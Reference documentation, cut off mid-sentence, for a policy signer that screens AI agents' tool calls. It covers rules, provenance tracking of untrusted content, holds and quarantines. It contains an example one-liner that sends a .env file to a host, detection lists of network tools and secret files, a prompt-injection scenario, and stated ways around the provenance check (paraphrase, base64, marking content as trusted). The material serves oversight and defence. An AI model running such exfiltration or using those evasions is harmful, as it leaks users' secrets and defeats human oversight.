# Policy reference (v2 signer)

The v2 signer decides every tool call itself, over the raw arguments, with its own policy (`tracekit/policy2/`). The
agent can't change the policy or the tool's class: a class the adapter declares is a hint, and the class the policy
maps the tool to wins. The v1 daemon's regex engine is a different one ([migrating](migration.md#what-changes)).

```sh
tracekit policy lint my-policy.yaml       # every error at once
tracekit policy compile my-policy.yaml    # canonical JSON and its policy_hash
```

The signer loads `policy:` from `signer.yaml` (YAML or JSON), or `tracekit/policy2/packs/dev.yaml` by default, and
refuses to start on a lint error. `dev.yaml` is the laptop pack: the server deployments set `policy:` to the server
pack. The image links the installed packs at `/etc/tracekit/packs`; its example config runs
`/etc/tracekit/packs/server.yaml`, and the Helm charts and the compose stack mount a `/etc/tracekit/policy.yaml` that
says `extends: packs/server.yaml` (Helm value `signer.policy`; compose's `policy.yaml`). Replace that file with your
own policy; `extends` takes relative paths only, so a policy at `/etc/tracekit/policy.yaml` reaches the server pack as
`packs/server.yaml`.
YAML policies are always read by Tracekit's own YAML subset (`tracekit/yamlmini.py`), never PyYAML, so a
policy means the same on every signer: duplicate keys, anchors, aliases and merge keys are errors.

## Decisions

Each matching rule adds its id to the decision; the strictest section wins: **deny > ask > flag > allow**. `flag`
lets the call run and marks it; `ask` holds it for an [approval](approvals.md). The signed `policy.decision` carries
the verdict, every matching rule id, `policy_hash`, `engine` (`re2@<version>` or `regex@<version>`), a fresh
`decision_id` and the `args_commitment`. The `decide` RPC answers `allow` for a flagged call, with the flag rule's id
in `rule_ids`: its `decision` says what the client does (run, refuse or hold the call), and is `allow`, `deny` or
`ask` for every client since RPC version 15. A signer can't tell which version a client speaks, and an older client
would refuse a value it doesn't know, so the flag is in the signed record only.

Rule ids the signer adds itself:

| Id | Verdict | When |
|---|---|---|
| `TK-ARGS-INVALID` | deny | the raw arguments are not strict JSON ([format v2](format-v2.md#1-canonical-json)); the Python client sends parsed arguments a frame can't carry (a lone surrogate) as raw text, so they get this signed deny too |
| `TK-A2A-NAME` | deny | an `a2a` call (the A2A gateway or `run.transfer`) names a sender, receiver, projector, modality, weights hash, skill or part kind that is not printable ASCII without spaces. The signer refuses spelling a rule could miss; signed arguments retain the original spelling, while the response has a fixed reason and remedy that never repeats it. |
| `TK-OVERSIZE` | the rule's section | a rule's subject is over 64 KiB of UTF-8; it is never cut or windowed, and the rule's own section decides (a flag rule flags, a deny rule denies; a shell command over 64 KiB denies). The decision's `reasons` (and the `decide` response's `reason`) name each such subject by its rule and field: `TK-S002's subject (the whole arguments)` |
| `TK-ENGINE-ERROR` | deny | the policy engine itself failed on the call's arguments (a bug): the call is denied and recorded, the decision's `reasons` (and the `decide` response's `reason`) name the error's type and the signer logs its traceback. Arguments nested too deeply to check are refused (`invalid_request`), not decided |
| `TK-SHELL-PARSE` | `on_parse_error` (ask) | a shell command can't be parsed, or what it runs can't be read from the line |
| `TK-SQL-PARSE` | ask | no SQL dialect can read the statement (an unclosed literal or comment), or it is not text |
| `TK-UNKNOWN-TOOL` | `unknown_tools` | the tool maps to no class and `unknown_tools` is `flag`, `ask` or `deny` (map an application's own tools to `app`) |

These, and the ids of holds, quarantines, live constraints and approvals (`TK-HOLD`, `TK-QUARANTINE`,
`TK-CONSTRAINT`, `TK-LIMIT-SUM`, `TK-APPROVED`, `TK-APPROVAL-*`), are the signer's own: lint refuses a rule with one.

Each `decide` gets a new `decision_id`, consumed once by `complete` with the same arguments; `complete` with other
arguments is refused. Only deny and ask are remembered per `(tool_call_id, attempt)`. An allow after a deny for the
same arguments in a run is a signed `capture.gap{decision_flip}`; a class hint that disagrees with the policy is a
`capture.gap{class_mismatch}` and the stricter of the two decisions applies.

## File format

```yaml
version: '2026.10-v2-1'
description: what this policy is for
extends: coding.yaml            # optional: a relative path, or a list of them; the compiled policy names parents by hash
unknown_tools: ask              # allow (default), flag, ask or deny
on_parse_error: ask             # ask (default) or deny: TK-SHELL-PARSE's verdict, a shell command the parser can't read
tools:                          # tool name or glob (fnmatch) -> class
  Bash: shell
  'mcp__*': mcp
  transfer_funds: payment
  search_flights: app           # an application's own tool: known (unknown_tools leaves it alone), no class fields
untrusted: [http, mcp, WebFetch]   # tool classes and tool name globs whose results are untrusted content (Provenance)
handoffs: [transfer_to_refunds_agent]   # tool names the framework runs as handoffs to another agent (OpenAI Agents'
                                        # transfer_to_*, LangGraph routing schemas such as CompleteOrEscalate); no
                                        # pack names any: exact names, as your agents' handoff tools are called
structured_output: ['browser_use:*']    # tool names the model asks for in its structured output, not as tool calls:
                                        # reconciliation doesn't compare them with tool uses (browser.yaml names these)
explains:                       # hosts a tool's own dependencies reach, for the egress observer (docs/egress.md#explains)
  - {label: package-install, hosts: [pypi.org, '*.pythonhosted.org']}   # a rule label, or a tool glob: {tool: ...}
deny:  [<rule>, ...]
ask:   [<rule>, ...]
flag:  [<rule>, ...]
sequences: [<sequence>, ...]    # detection (below): steps across calls
limits:    [<limit>, ...]       # detection: counts and sums in a window
respond:   [<respond>, ...]     # detection: what each trigger does (shadow, or enforced: docs/incidents.md)
```

`extends` merges the parent's `tools` under the child's, joins every `untrusted`, `handoffs`, `structured_output` and
`explains` list (a child can't remove a name its parent declares), keeps the parent's other top-level keys unless the
child sets them, and keeps the parent's rules except those whose id the child redefines. A list of parents is merged in
order (a later parent's top-level keys and tools win; the same rule id in two parents is a duplicate-id error, unless
both carry the identical rule, which is kept once). `sequences`, `limits` and `respond` merge the same way, by id
(`respond` by trigger): a deployment that adds a sequence keeps the pack's. The compiled `extends` is the list of their
hashes. An absolute path, `~` or a loop is an error.

**Rule fields:**

| Field | Required | Meaning |
|---|---|---|
| `id` | yes | unique across the policy |
| `pattern` | yes | RE2-subset regex, searched for in the subject (unanchored unless it uses `^`/`$`) |
| `class` | no | the rule applies only to tools of this class; without it, to every tool |
| `tool` | no | regex that must match the whole tool name |
| `field` | no | which subject to match (below) |
| `unless` | no | regex; a subject that matches it is exempt |
| `reason`, `rationale`, `label` | no | text; `reason` is shown with the decision, `label` names a flag's category (sequences and limits match labels) |
| `remedy` | no | on a `deny` or `ask` rule: what to do instead, one sentence (below) |
| `from` | no | `untrusted`: the rule also needs a value of its subject that only untrusted content brought into the run (Provenance) |
| `approval` | no | on an `ask` rule only: `executor: t1` (default) or `t2` ([approvals](approvals.md#tiers-t1-and-t2-executors)), and/or `passkey: required` ([approvals](approvals.md#web-approvals-and-passkeys)), and/or `agent` (below) |

A `remedy` says what the agent does instead and what a person can do (approve the held call, allow it in their own
policy, give the agent a sandbox): `Push without --force, --mirror or a + refspec (rebase onto the remote branch, or
push a new branch); a person rewrites shared history themselves.` The `decide` response's `reason` for a deny or an
ask is the matching rules' reasons joined by `; `, then each remedy once, so the client shows it to the model and
`tracekit view` shows it under the rule in the decision's detail. The signed record names only the rule ids, and the
policy (by its `policy_hash`) holds the text. Lint keeps a remedy to one line of at most 200 characters, starting with
a capital letter and ending with a period, in the present tense (no `should`, `would`, `could`, `might`, `please`,
`maybe`, `perhaps`, `consider` or `try to`), and refuses one on a flag rule: a flagged call runs. The deny and ask rules
of `coding.yaml`, and those `server.yaml` and `strict.yaml` add themselves, carry one; the browser, data, network,
cloud and communication packs' rules don't yet, so their calls get the reason alone.

`on_parse_error: deny` denies (rather than holds) a shell command the parser can't read or whose program it can't see
(`TK-SHELL-PARSE`: an unclosed quote, a command name from a variable, a script piped into a shell). Use it where no
person answers holds; expect more denials of ordinary commands that build a name at run time. It decides only
`TK-SHELL-PARSE`; `TK-SQL-PARSE` always asks.

Lint also rejects unknown keys, a `field` the rule's class doesn't have, and a class rule no tool maps to ("can never
fire"). It warns (`tracekit policy lint`, which loads the policy all the same) on a tool mapped to `unknown`: that is
what an unmapped tool already is, so `unknown_tools` still decides it. Map an application's own tools to `app`.

### Agent approvers (`approval.agent`)

`approval: {agent: {mode, allow: {fields}, budget?, veto_s?}}` lets an agent approver answer the rule's held calls
within bounds ([approvals](approvals.md#agent-approvers)). It is part of the policy, so of `policy_hash`.

| Key | Meaning |
|---|---|
| `mode` | `enforce`, or `shadow`: answers are recorded as `approval.suggested` and change nothing |
| `allow.fields` | argument name → `{type: integer\|string\|boolean, min?, max?, enum?, pattern?}`; `min`/`max` on integers, `pattern` (RE2 subset, whole value) on strings, `enum` values of the field's type. A closed world: every argument must be named, every named one present |
| `budget` | `{count?, sum?: {field, max}, window, scope: tenant\|requester}`: at most `count` agent approvals, and `sum` of an integer field with `min` >= 0, in `window` seconds (at most 30 days) |
| `veto_s` | an agent's approval runs only after this many seconds, so people may revoke it first |

Lint errors: `approval.agent` with `passkey: required`, or on a `from: untrusted` rule (people answer those). A warning
(`tracekit policy lint`): `approval.agent` on a `payment` rule without `executor: t2`, where the approval binds the
arguments the agent reported rather than what runs. The signer refuses to start with a policy that has agent rules
and no `approvals.agents`.

`policy_hash` is `sha256:` of the compiled policy as sorted-key, compact JSON (`policy2.compile.canonical`).

## Classes and fields

An MCP tool (`mcp:<server>/<tool>`) is also checked under its bare name `<tool>`, in that name's own class if `tools:`
maps it, else the MCP call's; the stricter decision applies, with both readings' rule ids. A rule on an app tool's name
holds when the same call is labelled an MCP one.

The signer maps the tool to a class (`tools`: exact name first, then the most specific matching glob, the one with
the most characters other than `*` and `?`, so `mcp:postgres/*` wins over `mcp:*/*`; else `unknown`) and extracts the
class's fields from the raw arguments (`policy2/classes.py`):

| Class | Fields | Taken from |
|---|---|---|
| `shell` | `command`, `argv`, `line`, `effects`, `package_index`, `container_host_access` | `command`, `cmd` or `commands` (one of them: a string, or a list of strings); `effects` is each file the commands write or delete (below); `package_index` is each explicitly selected package source (an index or registry option, `-f`/`--find-links`, or a variable such as `PIP_INDEX_URL` or `npm_config_registry` before a command or through `env` or `export`), with default PyPI/npm registries omitted; `container_host_access` detects host-access options of a `docker`/`podman run` (those before the image; later words are the container's command) |
| `fs` | `path`, `op`, `content_digest` | `file_path`, `notebook_path`, `path`; op from the tool (Write, Edit, Read…) or `op` |
| `http` | `method`, `url`, `host`, `internal`, `sends_to` | `url`, `method` (default GET); `host` and `internal` as below; `sends_to`: the host, when the method is not GET or HEAD or there is a `body`, `data`, `json`, `files`, `form` or `content` |
| `sql` | `statement`, `code`, `verb`, `db` | `sql`, `query` or `statement`; `db` or `database`; `code` as below, `verb` its first word |
| `payment` | `amount`, `currency`, `payee`, `new_payee`, `payees` | `amount`/`amount_cents`, `currency`, `payee`/`to`/`recipient` (`new_payee` is not extracted yet); `payees`: every one of `payee`, `to`, `recipient`, `destination`, `account`, `account_number`, `iban` |
| `email` | `to`, `domains`, `attachments`, `recipients` | `to` (string or list), `attachments`; `recipients`: every one of `to`, `cc`, `bcc`, `recipients` |
| `mcp` | `server`, `tool`, `args` | the tool name (`mcp__server__tool` or `mcp:server/tool`) and the arguments |
| `browser` | `action`, `url`, `scheme`, `host`, `internal`, `sends_to` | `action`, `url`; `scheme`, `host` and `internal` as below; `sends_to`: the host of `page_url` for `input` and `upload_file`, and the URL's host for a `navigate` or `go_to_url` whose URL has a query string |
| `a2a` | `sender`, `receiver`, `route`, `skills`, `kinds`, `hosts`, `size`, `modality`, `projector`, `weights` | A2A gateway arguments, or `run.transfer`; names are lower-cased for this class and unprintable names are refused as `TK-A2A-NAME`. |
| `app` | — | — (an application's own tool: known, so `unknown_tools` doesn't apply; rules reach it by `tool` name, `field: target` or a raw argument `field`) |
| `unknown` | — | — |

Every class also has `target`: what the call acts on rather than what it carries (below).

The shell field `effects` is each file the commands write, as `WRITE_TARGET:path`, or delete, as
`DELETE_TARGET:path`, each also with the path casefolded: what a redirection writes, and the files `rm`, `unlink`,
`shred`, `truncate`, `tee`, `cp`, `mv`, `install`, `ln`, `dd of=`, `sed -i` and `perl -i` name (`mv` deletes its
sources; `cp`, `mv`, `install` and `ln` into a directory, `-t`'s or one that ends in `/`, also write each source's name
there), and the start paths of a `find` with `-delete` or `-exec rm` and the log or history names among its tests. A
rule on `effects` can tell a destination from a file a command only reads or copies. The tags are not in `target`,
so a target rule reads the same subjects as before `effects` existed.

- `host`: the URL's host as a browser reads it (`host:port/path` without a scheme is http; controls, tabs and newlines dropped, `view-source:` and `blob:`
  peeled, `\` as `/`, any number of slashes after the scheme, the host after the last `@`), percent-decoded, NFKC
  (fullwidth letters and digits), casefolded, without port or trailing path; an IP address in its canonical form
  (`169.16689662`, `0xa9.0xfe.0xa9.0xfe` and `[::ffff:a9fe:a9fe]` are all `169.254.169.254`).
- `internal`: `true` when the host is a loopback, private, link-local, shared (CGNAT), reserved, multicast or
  unspecified address in any notation (also the IPv4 address inside a mapped, compatible, 6to4 or NAT64 IPv6 address),
  looks like an address but is none (`1.2.3.4.5`), or when a browser and Python's urllib read different hosts from the
  URL (`http://a\@b/`); else `false`.
- `scheme`: the URL's scheme as a browser reads it (`view-source:file:` and `fi<TAB>le:` are `file`).
- `code`: the statement with comments blanked and every literal and quoted identifier (`'…'`, `E'…'`,
  `$tag$…$tag$`, `"…"`, `` `…` ``, `[…]`) replaced by `''` or `""`, once for each way PostgreSQL, MySQL, SQLite and
  SQL Server split it (backslash escapes, `#` comments, nested `/* */` and `--` differ), so a keyword hidden in one
  dialect's comment or literal but run by another is still seen. A dialect that can't read it (an unclosed literal)
  is left out.

## What a rule matches (the subject)

| Rule | Subject |
|---|---|
| `class: shell`, no `field` or `field: argv` | each simple command the line runs, as its argv joined by spaces, argv[0] a basename in lower case (the agent's file system may ignore case) |
| `class: shell`, `field: command` | the raw command line |
| `class: shell`, `field: line` | the raw command line and each line the parser normalised (quotes and escapes resolved, redirections kept), as typed and again with its program names in lower case |
| `class: fs`, `field: path` | the normalised path, and with a `..` also the lexically normalised one; each also casefolded |
| `class: sql`, `field: code` | each dialect's reading of the statement (`code` above) |
| `class: shell`, `field: effects` | each `WRITE_TARGET:path` and `DELETE_TARGET:path` (above), also casefolded |
| `field: target` (any class, or no class) | shell: each command's argv without its data words (a `git commit`/`tag`/`merge` message, the pattern `grep`, `rg` or `git grep` searches for), its redirection targets and `VAR=` assignments, and a program an interpreter reads from a heredoc or herestring (a command it can't parse: the raw command), each also casefolded (the write and delete tags are `effects`, not targets); fs: the paths; http and browser: the URL; email: the attachments; mcp, app and unknown tools: the whole arguments. Each URL in a target is also matched as `scheme://canonical-host/` |
| another class field | the extracted field |
| a `field` that is no class field | the raw argument of that name |
| no `field` (not shell) | the whole arguments as compact sorted JSON (so Write content, WebFetch URLs and MCP arguments are scanned) |

A rule fires when its pattern matches any of its subjects and `unless` does not match that subject. Use `unless` only
where the subject is one target (a file path): in a whole command line it could exempt a different target. `target`
is a class field in every class, so a rule can't name a raw argument called `target`.

**Shell parsing** (`policy2/shell.py`, its own tokenizer): quotes, escapes, `;` `|` `|&` `&&` `||` `&`, newlines,
`$()`, backticks, `<()`, heredocs, `VAR=` prefixes and wrappers (`sudo`, `env`, `nohup`, `timeout`, `xargs`, `nice`,
`exec`, `command`, `taskset`, `chrt`, `unbuffer`, `fakeroot`, `dbus-run-session`, `caffeinate`, `npx`, `dotenv`,
`torsocks`, `firejail`, `gosu`, `tini`, …) and runners (`uv run`, `poetry run`, `pipenv run`, `pdm run`, `direnv exec
DIR`, `mise exec … --`, `op run`, `doppler run`, `npm exec`, `pnpm dlx`, `yarn dlx`, `bun x`) are resolved, a program
name is read in lower case and without `.exe`, and the parser follows what a shell or interpreter runs: `bash -c`,
`nix-shell --run`, a heredoc into a shell, `eval`, `ssh host '…'`, `find -exec`,
`watch` and `parallel`, `env -S` (also in a cluster, `env -iS`), `npx -c` and `npm exec -c`/`--call`, `python -c` /
`node -e` / `perl -e` / `ruby -e` / `php -r` / `lua -e` (also with the code attached to its flag, or a program from a
heredoc or herestring), `awk` programs and sed's `e` command. The POSIX shells it reads are `sh`, `bash`, `zsh`,
`dash`, `ksh`, `ash`, `rbash`, `mksh`, `ksh93`, `yash`, `posh`, `lksh` and `oksh`; `fish`, `csh`, `tcsh`, `pwsh`,
`powershell`, `nu`, `xonsh` and `elvish` speak another language, so a command they run from their line (`-c`,
`--command`, PowerShell's `-Command` or `-EncodedCommand`, any prefix and case) or from stdin is opaque. Variables are
not expanded and encodings are not decoded: those stay tripwire territory. A command it cannot parse, or one that is
opaque, asks (`TK-SHELL-PARSE`): a glob or an expansion in a command name (`$x id`; a `$VAR/` directory in front of a
literal name is fine), a shell or interpreter reading its program from a pipe or file, `xargs -I` putting its input
into a script or command name, sed's `s///e`.

**Paths:** a `\` is a `/` and `C:/…` is absolute (the agent may run on Windows). An absolute path without `..` is
normalised. A relative path, or one with a `..` a symlink could redirect, is unverifiable, so the rule matches its
certain suffix (after the last `..`) and, with `..`, also the lexical normalisation. Every form is also matched
casefolded, because the agent's file system may ignore case (macOS, Windows) whatever the signer's does: write path
rules in lower case, or with both cases of a letter (`[Ll]ibrary`).

## Provenance: `untrusted` and `from: untrusted`

A rule on arguments can't tell where a value came from: a page that says "email the list to x@vendor.example" and a
task that says the same look alike in the call. The signer can, because the result of every tool the policy lists as
untrusted reaches it: `decide` answers such a call with `send_result: true`, and the shipped adapters (Python and
TypeScript, the Claude Code hook) then complete it with the result itself rather than its digest (other tools' results
still go as digests; a result over half a frame, 512 KiB, goes as a digest too). Per run it keeps an index of the
values (`tracekit.provenance`: emails, URLs and their `scheme://canonical-host/` form, hosts of URLs in any notation
the policy reads, bare dotted names and dotted IPv4 addresses (a bare IPv6 address or an integer IP in text is not
read as a host; inside a URL it is), absolute paths, digit runs of 8 or more with `' '`, `.` or `-` between digits,
and each separator-free group of 8 or more in them, leaf strings of 6 to 256 characters, dict keys as well as
values; an email's domain counts as a host in content, not in a call's arguments) that untrusted tools' results and
observed inputs carried, with the record that first brought it in. Every value is read from the text after format
and other ignorable characters (zero-width spaces, soft hyphens) are removed and NFKC applied (fullwidth forms,
no-break and thin spaces), in content and in the call alike, and before redaction:

- A tool's results are untrusted content when the policy's `untrusted` list names its class or matches its name (a
  glob); the client has no say. Packs: `coding.yaml` http, mcp, WebFetch, WebSearch; `browser.yaml` browser;
  `server-net.yaml` http; `server.yaml` http, browser, mcp (it maps no tool that reads mail, tickets or documents:
  list your own, such as `read_inbox` or `get_ticket`).
- `observe` (Python `run.observe(value, source=..., trust="untrusted")`, TypeScript `run.observe(value, source,
  trust)`) records other content: a mail, a ticket, a page the app fetched itself. Send the task or user prompt with
  `trust="trusted"`. That label is the calling process's claim, and the signer takes it as given: provenance protects
  against injected content, not against a malicious agent program, which can observe anything as trusted (or send
  digests instead of results) and so get past `from` rules. The task must come from the caller, not from the agent;
  an agent that observes an attacker's text as trusted only hides its own input.
- Results of tools not in `untrusted` (SQL, shell, your own tools) are not indexed either way: a tool can echo what
  the agent put in its arguments (`echo`, `select '…'`), so counting its output as trusted would launder an injected
  value. Only an input observed as `trusted` makes a value trusted, whichever came first. A value the deployment's
  own data supplies (a customer's address from your CRM that also appears in their ticket) reads as untrusted-only
  until the app observes it as trusted, so a reply to it is held: observe the record you looked up, or answer the
  hold.

A rule with `from: untrusted` matches only when its pattern matches as usual **and** a value in that subject is
untrusted-only in the run. A list field (`payees`, `recipients`) is checked element by element; `sends_to` is looked
up as the host it is. A decision records `provenance` (up to 16 arguments whose values are untrusted-only, as
`{field, kind, source: {run_seq, tool, tool_call_id}}` — never the value) when there is something to show, and
`provenance_state` with `provenance_reason` when the index is not `complete`
([format](format-v2.md#3-events)):

| State | When |
|---|---|
| `partial` | an untrusted tool's call completed with a digest, a `{hash, size}` reference or no result (an adapter that ignores `send_result`), or a client's events skipped a `client_seq` (`client_counter_gap`: an observe or a result the signer never got), from the decision that reveals the gap on |
| `truncated` | a result or untrusted observed input carried more values than are read (4096 values, 1 MiB of text), or the run's index reached 20000 values |
| `unavailable` | the signer restarted: the index lives in memory only (a storage outage the signer recovers from keeps it) |
| `timeout` | reading this call's values took past the decision's deadline (1 s) |

**Fail closed:** in every state but `complete` a `from: untrusted` rule matches whenever its pattern does, in its own
section (the packs' `TK-P` rules ask), since the index can no longer say a value is not untrusted. The first cause
stays for the rest of the run (`timeout` only for that decision). The work is bounded: reading values is linear in
the text (1 MiB in well under a second), and a decision reads them only while its index has entries.

| Pack | Section | Rules |
|---|---|---|
| `server-comms.yaml` | ask | `TK-P001` an email recipient (`to`, `cc`, `bcc`, `recipients`) that is untrusted-only · `TK-P002` a payee or account (`payee`, `to`, `recipient`, `destination`, `account`, `account_number`, `iban`) that is untrusted-only |
| `server-net.yaml`, `browser.yaml` | ask | `TK-P003` data sent (a method other than GET or HEAD, or a body; in a browser, typing, an upload or a navigation with a query string) to a host that is untrusted-only |

Limits ([all of Tracekit's](limits.md)): it matches values verbatim, and only what came in through untrusted tools and observed inputs: a page the
agent fetches with a tool the policy doesn't list as untrusted (`curl` in a shell) is not indexed, so list such tools
or observe the content. A value the model paraphrases, splits or re-encodes (spelled out, base64, a URL
shortener) reads as a new value and gets past it. `trust: "trusted"` is the calling process's claim: provenance
protects against injected content, not against a malicious agent program. It is a tripwire on the commonest way
injected instructions act; to prevent the flow, use information-flow control (CaMeL, FIDES) in the agent.

## Detection: sequences, limits and respond

A rule decides each call on its own. Detection looks across calls: a secret read and then a URL, a runaway loop, a
burst of deletes, repeated denied attempts. It runs in the signer (`tracekit/signer/detect.py`), is part of the policy
(so it is in `policy_hash`), and is a pure function of signed records: a verifier or `tracekit policy backtest` gets
the same answer from the same records. No regex runs for it: it reads the rule ids each decision already carries.

```yaml
sequences:
  - id: TK-Q001
    steps: [secrets_access, egress]   # rule ids or labels, in order
    scope: session                    # run (default), session, owner or principal
    window: 600                       # seconds from the first step
    unless: [allowlisted]             # optional: a call that also carries one of these is not a step
limits:
  - id: TK-L002
    match: destructive                # a rule id, a label, or * (every call)
    count: true                       # or sum: {field: cents, currency_field: currency}
    max: 30                           # an incident when a window goes past it
    window: 60
    scope: session
respond:
  - {trigger: TK-L002, mode: shadow, action: hold}   # mode off|shadow|enforce, action notify|hold|quarantine
  - {trigger: denied_calls, mode: shadow, action: notify, max: 5, window: 300, scope: run}
  - {trigger: executed_against_policy, mode: enforce, action: quarantine, cooldown_s: 3600}
```

**What counts.** A call's names are its rule ids from both class readings (the policy's and the client's hint, so a
mismatch can't hide a step), each rule's `label`, and `*`. A call counts when it was decided `allow` or `flag`, or, for
`ask`, once the approval of that decision is consumed; never when it was asked and not consumed, or denied, and never
later: a step counts when it is decided, whether or not the call then runs. A call that runs against its decision is
`executed_against_policy` (below), not a step. A call whose class is unknown (a tool the policy doesn't map, such as
an alias) matches every step and limit: fail closed.

One call advances each partial sequence by one step, or, when its own names match consecutive steps, through all of
them, each name once: a command that reads a secret and sends it (`curl "https://host/?k=$(cat .env)"`) completes
`[secrets_access, egress]` on its own, while `[egress, egress]` still needs two calls. A step reached through `*` or
an unknown class never takes a call further, so no single unmapped call completes a sequence.

A sum limit reads the `field` (an integer of minor units, cents, at least 0) and the `currency_field` (a three-letter
code, case and surrounding spaces aside) of the call's arguments and keeps one total per currency. A call of a known
class it counts without both is held (`ask`, rule `TK-LIMIT-SUM`: send the amount as a non-negative integer in minor
units with its currency code), unless the limit's `respond` mode is `off`; an unknown-class call is counted when its
amount can be read and is never held for it. Lint rejects unknown names, a name only deny rules carry (it can never
count), windows outside 1..86400 s, more than 64 steps or more than 1024 sequences and limits together, a limit keyed
by a raw tool name (name a rule or label: an alias can't dodge those), a sum limit matching `*`, and sequences or
limits while `unknown_tools` is `allow`.

**Labels.** The packs label their flag rules. `secrets_access` (`TK-F005`) is any call that acts on a secrets file's
name (`.env`, `id_rsa`, `.ssh/`, `credentials`, `.aws/`, `.netrc`): a command's argv or redirection, a file path, an
MCP tool's arguments or a URL, of any tool, writes included; a target that is one env template path (`.env.example`,
`.sample`, `.template`, `.dist`) is not. `egress` is any URL a call acts on (`TK-F012`: an http or browser URL, a URL
in a command, an MCP tool's arguments; GETs with a query string included, not only `sends_to`) and any network command
whatever it names (`TK-F013`: curl, wget, ssh, scp, rsync, nc, ncat, telnet, ftp, dig, nslookup, host). Mail,
payments, SQL and MCP tools without a URL in their arguments are not egress: label your own tools that send data out
(`label: egress` on a flag rule) to bring them in.

**Scope.** `run` is one run; `session` is the root of the run's `parent_run` chain (a run registered without a parent
is its own session, so a split across runs is caught only when the second names the first as parent); `owner` is the
identity that registered the run; `principal` is the run's attested principal (an unattested one counts as `owner`).

**Windows** are fixed: one starts at the first call counted and lasts `window` seconds of the records' `ts`, the
signer's clock. A burst that straddles two windows can reach up to twice `max` before a limit fires. A scope with no
record for an hour (or the longest window, if longer) starts over, open incidents included.

**Decisions** under a policy with sequences or limits carry what detection saw:
`detect: {sequences: [{id, step}], limits: [{id, count, window_start}], state}` (with `rule_ids` when the two class
readings differ, and `sums` for sum limits). `state` is `complete`, or `unavailable` when the detector can't vouch for
what came before: after a restart from a snapshot written without detection or under another policy (until the
longest window has passed), after replaying decisions made under another policy (until the longest window after the
last of them), and for a run it never saw registered. Runs open across such a restart keep their session, owner and
principal.

**Triggers and incidents.** A sequence completing and a limit going past `max` open an incident (`mode: off` in
`respond` silences one). These triggers fire only with a `respond` entry: `executed_against_policy` (a call ran after a
deny or an unapproved ask), `denied_calls` (more than `max` distinct denied calls, per tool call and attempt, in
`window`, at most 1000; nondeterministic denies, and denies that only `TK-ARGS-INVALID` or `TK-OVERSIZE` caused,
don't count), `provenance` (a `from: untrusted` rule held a call whose decision names its provenance and whose index is
complete), and the notify-only `class_mismatch`, `refusal_burst` (a `refusal.summary` over `max`) and `tamper`, which
are never enforced (lint refuses `mode: enforce` or an action other than `notify` on them). Only `denied_calls` takes
`max`, `window` and `scope`, and `refusal_burst` `max`; lint refuses them elsewhere. `unexplained_effect` (a host an
[egress observer](egress.md) saw a run reach that nothing explains) fires once per host and run; the server pack
notifies on it in shadow mode until a deployment's `explains` is tuned.

An incident is a signed `incident.opened {incident_id, trigger, rule_ids, scope, cites, mode, actions, would}` in the
run whose record fired it, citing the records that make it up. One stays open per scope, trigger and rule: later
matches are an `incident.updated {incident_id, cites}` at most once per window of its trigger (a minute for a trigger
without one), written in the run whose record matched, which for a `session`, `owner` or `principal` scope can be
another run than the one that opened it. Only opened incidents count toward the caps: 100 per run and trigger, 60 per
tenant a minute, of which one run may open 20; past a cap one `incident.capped {cap, max, trigger, reason}` is written
instead. An incident carries its trigger's `respond` mode. In **shadow** it has no `actions` and `would` names the
configured action. In **enforce** the signer acts in the same writer step as the record that fired it and lists what it
did in `actions`:

| `action` | What the signer does ([incidents](incidents.md)) |
|---|---|
| `notify` | Nothing more than delivering the incident to every webhook subscribed to `incident` events, at least once (the signer refuses to start without one). |
| `hold` | Every live run the incident's scope reaches is held: its live approvals expire, and each further call is an `ask` (rule `TK-HOLD`, with the `incident_id`) that only a person answers: never an agent approver, never the run's owner, principal or requester, whatever `self_approval` says. The call that fired the hold is decided again, held. With no person approver configured, a hold is a quarantine. |
| `quarantine` | Every live run the scope reaches is quarantined, for good: each further call is denied (`TK-QUARANTINE`; past 100 such denies, refused unrecorded), approvals are refused, a gateway forwards no further model request of it, and it closes with reason `quarantine`. |

`cooldown_s` (default 3600, at most 86400): for that long, a new run of the same owner and attested principal (and any
child run of a held one) starts held or quarantined too. No trigger suspends an identity: that is an operator's call
(`tracekit signer incidents suspend`), and lint refuses `suspend:` in `respond`. Operators resolve incidents, hold, quarantine and resume runs, pause the response engine and suspend identities
with `tracekit signer incidents` ([incidents](incidents.md)).

**Backtest.** `tracekit policy backtest --policy P --store DIR` (a signer's `data_dir/store`, read-only, safe while it
runs) or `--bundle B...` runs the policy's detection over recorded runs and prints the incidents it would open. It
reads the rule ids each decision recorded (arguments are not stored), so for decisions made under another policy, rules
and labels the new one adds or changes are not applied; it warns with their count. Backtest changes to sequences,
limits and `respond` this way; measure new rules and labels by running the policy in shadow.

### Choosing thresholds

The server pack's thresholds are judgment, checked against the shipped runs: the golden v2 bundles
(`tests/golden/v2/`, decided under a test policy) and the server demo (`tracekit demo --server`, decided under the dev
pack). Those runs are small (at most 3 decisions and 1 destructive command in any minute) and open no incident;
`TK-L001` (every call) and `TK-L002` (`destructive`, `TK-F003`, the same rule in the dev pack) sit well above them: 300
calls a minute (an agent working makes a few dozen) and 30 destructive commands a minute. `TK-Q001` was not
backtested: none of those runs reads a secret or sends anything, and the golden bundles record a test policy's rule
ids; its ten minutes are a judgment of how long a secret read and its use stay related. Before enforcing anything,
record runs under the pack in shadow, backtest your own store and set `max` above the busiest minute you see.

## Live constraints

A policy is written ahead of time; a person's request often adds a limit for one task: "don't touch billing.py",
"read-only, just tell me what you'd change", "don't push". A live constraint is such a limit, held by the signer for the
rest of the run. It is experimental, new in 1.4.

The Claude Code hook (and the Codex, Cursor and Gemini hooks, which share it) reads the person's prompt at
`UserPromptSubmit`, as the harness hands it over, and sends each constraint it states with `constraint_add` (RPC 19),
each on its own and before it records the prompt; a scope (`only_change`) it leaves to `tracekit analyze --v2`
(TK-X204), since holding every other write would ask the person about each test, lockfile or build write. The
session's state keeps them: after the signer closes an idle run, the session's next run gets every constraint its
earlier prompts stated (kept before they are sent, so a signer it can't reach at that prompt loses none). A small
fixed grammar reads them ([tracekit/constraints.py](../tracekit/constraints.py)) and leaves what is ambiguous unread,
so it holds no wanted call: a condition on the work ("don't edit X until the tests pass", "while the server runs"; a
condition on the person's own go-ahead keeps the constraint, as holding the call for them is what they ask: "don't push
before I review", "never touch X without asking me first", "unless I confirm"), a question ("should I change X?"), quoted text, quoted lines and code, a description rather than an
instruction ("add a read-only mode", "we don't use the network in unit tests"), a negated change of one aspect of the
file asked for ("don't change the public API of X, just fix the bug in it"), a scoped push ("don't push to main"),
and a constraint a later clause of the same request lifts ("don't touch X for now; ... then update X too") state none
([limits](limits.md#intent-reasoning-and-action-checks)). A later "it", "them" or "there" lifts the file named before
